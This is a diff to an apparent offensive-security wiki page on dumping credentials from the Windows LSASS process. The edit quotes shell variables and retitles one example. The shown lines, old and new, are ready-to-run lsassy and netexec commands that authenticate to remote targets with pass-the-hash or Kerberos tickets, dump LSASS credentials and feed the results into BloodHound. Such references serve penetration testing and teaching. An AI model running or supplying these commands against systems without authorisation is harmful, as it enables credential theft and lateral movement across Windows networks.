@@ -25,19 +25,19 @@ The Local Security Authority Subsystem Service (LSASS) is a Windows service resp
 
 ```bash
 # With pass-the-hash (NTLM)
-lsassy -u $USER -H $NThash $TARGETS
+lsassy -u "$USER" -H "$NT_HASH" "$TARGETS"
 
-# With plaintext credentials
-lsassy -d $DOMAIN -u $USER -H $NThash $TARGETS
+# With pass-the-hash and domain
+lsassy -d "$DOMAIN" -u "$USER" -H "$NT_HASH" "$TARGETS"
 
 # With pass-the-ticket (Kerberos)
-lsassy -k $TARGETS
+lsassy -k "$TARGETS"
 
 # netexec Module examples
-netexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash -M lsassy
-netexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=Somepassw0rd
-netexec smb $TARGETS -k -M lsassy
-netexec smb $TARGETS -k -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=Somepassw0rd
+netexec smb "$TARGETS" -d "$DOMAIN" -u "$USER" -H "$NT_HASH" -M lsassy
+netexec smb "$TARGETS" -d "$DOMAIN" -u "$USER" -H "$NT_HASH" -M lsassy -o BLOODHOUND=True NEO4JUSER="neo4j" NEO4JPASS="Somepassw0rd"
+netexec smb "$TARGETS" -k -M lsassy
+netexec smb "$TARGETS" -k -M lsassy -o BLOODHOUND=True NEO4JUSER="neo4j" NEO4JPASS="Somepassw0rd"
 ```
 
 
